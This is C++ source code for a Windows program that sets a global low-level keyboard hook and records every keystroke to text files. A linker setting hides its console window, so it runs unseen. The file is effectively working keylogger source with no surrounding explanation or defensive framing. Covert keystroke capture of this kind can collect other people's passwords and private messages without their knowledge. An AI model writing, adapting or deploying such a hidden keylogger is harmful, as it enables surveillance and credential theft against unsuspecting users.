#define _WIN32_WINNT    0400
#define STRICT
#define WIN32_LEAN_AND_MEAN
#include <cstdio>
#include <iostream>
#include <windows.h>
#include <fstream>
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
using namespace std;
DWORD   g_main_tid = 0;
HHOOK   g_kb_hook   = 0;
bool shifted=0; 
ofstream fout;
int n=1;
BOOL CALLBACK con_handler (DWORD) {
	PostThreadMessage (g_main_tid, WM_QUIT, 0, 0);
	return TRUE;
};
string toch(int x){
	string ans;
	if(x>='0'&&x<='9'){
		ans=x;
		return ans;
	}
	if(x>='A'&&x<='Z'){
		ans=x;
		return ans;
	}
	if(x==8) return "[Backspace]";
	if(x==13) return "[Enter]";
	if(x==20) return "[Caps Lock]"; 
	if(x==32) return "[Space]";
	if(x==46) return "[Delete]";
	if(x==161||x==160){
		return "[Shift]";
	} 
	if(x==162||x==163) return "[Ctrl]";
	if(x==164||x==165) return "[Alt]";
	if(x==186) return ";";
	if(x==187) return "=";
	if(x==189) {
		ans='-';
		return ans;
	}
	return "";
}
LRESULT CALLBACK kb_proc (int code, WPARAM w, LPARAM l) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)l;
	const char *info = NULL;
	if (w == WM_KEYDOWN){
		info = "Key Down";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_GREEN);
	}
	else if (w == WM_KEYUP)
		info = "Key Up";
	else if (w == WM_SYSKEYDOWN)
		info = "Sys key down";
	else if (w == WM_SYSKEYUP)
		info = "Sys key up";
	printf ("%s - vkCode [%d], ScanCode [%d], Char [",info, p->vkCode, p->scanCode);
	const string str=toch(p->vkCode);
	cout<<str<<']'<<endl;
	if(strcmp(info,"Key Down")) fout<<str<<' ';
	if(n==1){
		fout.close();
		fout.open("text.txt",ios::app);
	}
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
	return CallNextHookEx (g_kb_hook, code, w, l);
};
int main () {
	const int n=1;
	freopen("KeyRecording.txt","w",stdout); 
	fout.open("text.txt",ios::app);
	g_main_tid = GetCurrentThreadId ();
	SetConsoleCtrlHandler (&con_handler, TRUE);
	g_kb_hook = SetWindowsHookEx(WH_KEYBOARD_LL,&kb_proc,GetModuleHandle (NULL),0);
	if (g_kb_hook == NULL) {
		fprintf (stderr,"SetWindowsHookEx failed with error %d\n",::GetLastError ());
		return 0;
	}
	MSG msg;
	while (GetMessage (&msg, NULL, 0, 0)) {
		TranslateMessage (&msg);
		DispatchMessage (&msg);
	};
	UnhookWindowsHookEx (g_kb_hook);
	return 0;
};
